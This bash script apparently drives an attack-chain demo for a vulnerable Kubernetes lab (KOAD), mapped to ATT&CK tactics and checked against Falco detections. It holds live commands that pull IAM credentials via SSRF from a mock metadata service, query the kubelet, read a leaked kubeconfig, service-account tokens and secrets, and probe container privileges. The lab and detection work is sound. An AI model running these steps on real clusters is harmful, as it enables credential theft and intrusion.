#!/bin/bash
# KOAD Attack Chain — Automated full ATT&CK coverage demo
# Covers all 35 scenarios across 10 tactics
set +e

CYAN='\033[0;36m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

log() { echo -e "${GREEN}[ATTACK]${NC} $1"; }
attack() { echo -e "${RED}[ATT&CK]${NC} $1"; }
defend() { echo -e "${CYAN}[DETECT]${NC} $1"; }
phase() { echo -e "\n${YELLOW}========== $1 ==========${NC}\n"; }

SA_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || echo "NO_TOKEN")
API_SERVER="https://kubernetes.default.svc"

phase "TA0001 — Initial Access"

attack "S01 [T1190] SSRF → Metadata API"
log "curl http://ssrf-webapp.koad:5000/fetch -d 'url=http://mock-metadata.koad/latest/meta-data/iam/security-credentials/k8s-node-role'"
curl -s --max-time 10 "http://ssrf-webapp.koad:5000/fetch" -d "url=http://mock-metadata.koad/latest/meta-data/iam/security-credentials/k8s-node-role" 2>/dev/null | head -5 || log "SSRF webapp not reachable (expected in some configs)"

attack "S02 [T1133] Exposed Kubelet"
NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[0].address}' 2>/dev/null || echo "unknown")
log "Checking kubelet at $NODE_IP:10250..."
curl -sk --max-time 5 "https://$NODE_IP:10250/pods" 2>/dev/null | head -3 || log "Kubelet not directly accessible"

attack "S03 [T1078] Leaked kubeconfig in ConfigMap"
log "Reading leaked kubeconfig..."
kubectl get configmap app-config -n koad -o jsonpath='{.data.kubeconfig}' 2>/dev/null | head -5 || log "ConfigMap not found"

phase "TA0002 — Execution"

attack "S05 [T1609] kubectl from compromised Pod"
log "Using SA token to list pods..."
kubectl get pods -n koad --no-headers 2>/dev/null | head -5

attack "S06 [T1610] Deploy privileged Pod"
log "Checking ability to deploy privileged pods..."
kubectl auth can-i create pods -n koad 2>/dev/null

attack "S07 [T1053] CronJob persistence"
log "Checking for persistent CronJobs..."
kubectl get cronjobs -n koad --no-headers 2>/dev/null

phase "TA0003 — Persistence"

attack "S09 [T1098] RBAC manipulation"
log "Listing ClusterRoleBindings with koad labels..."
kubectl get clusterrolebindings -l koad-scenario --no-headers 2>/dev/null

attack "S10 [T1136] Backdoor ServiceAccount"
log "Checking for backdoor SA in kube-system..."
kubectl get sa system-controller -n kube-system 2>/dev/null || log "Backdoor SA not found"

phase "TA0004 — Privilege Escalation"

attack "S13-S18 [T1611] Container escape scenarios"
log "Checking container capabilities..."
cat /proc/self/status 2>/dev/null | grep -i cap || true
log "Checking if privileged..."
if [ -w /sys/fs/cgroup/devices/devices.allow ] 2>/dev/null; then
  log "Container appears to be privileged!"
else
  log "Container is not privileged (expected for attacker pod)"
fi

phase "TA0005 — Stealth"

attack "S22 [T1036] Masquerading check"
log "Checking for suspicious pods in kube-system..."
kubectl get pods -n kube-system -l koad-scenario --no-headers 2>/dev/null

phase "TA0006 — Credential Access"

attack "S26 [T1552] Unsecured credentials"
log "Reading secrets..."
kubectl get secrets -n koad --no-headers 2>/dev/null | head -5
log "SA token (first 30 chars): ${SA_TOKEN:0:30}..."

phase "TA0007 — Discovery"

attack "S27 [T1613] Resource discovery"
log "Namespace count: $(kubectl get ns --no-headers 2>/dev/null | wc -l)"
log "Pod count: $(kubectl get pods -A --no-headers 2>/dev/null | wc -l)"
log "Secret count: $(kubectl get secrets -A --no-headers 2>/dev/null | wc -l)"

attack "S29 [T1069] RBAC enumeration"
log "Permissions for current SA:"
kubectl auth can-i --list 2>/dev/null | head -10

phase "TA0008 — Lateral Movement"

attack "S30 [T1550] Cross-namespace access"
log "Accessing koad-production namespace..."
kubectl get pods -n koad-production --no-headers 2>/dev/null || log "Cannot access production namespace"
kubectl get secrets -n koad-production --no-headers 2>/dev/null || log "Cannot read production secrets"

phase "TA0040 — Impact"

attack "S35 [T1496] Cryptominer check"
log "Checking for miner pods..."
kubectl get pods -n koad -l koad-scenario=S35 --no-headers 2>/dev/null

phase "Attack Chain Complete"
log "All 10 ATT&CK tactics demonstrated."
log "Run Falco logs to see detection results:"
log "  kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50"
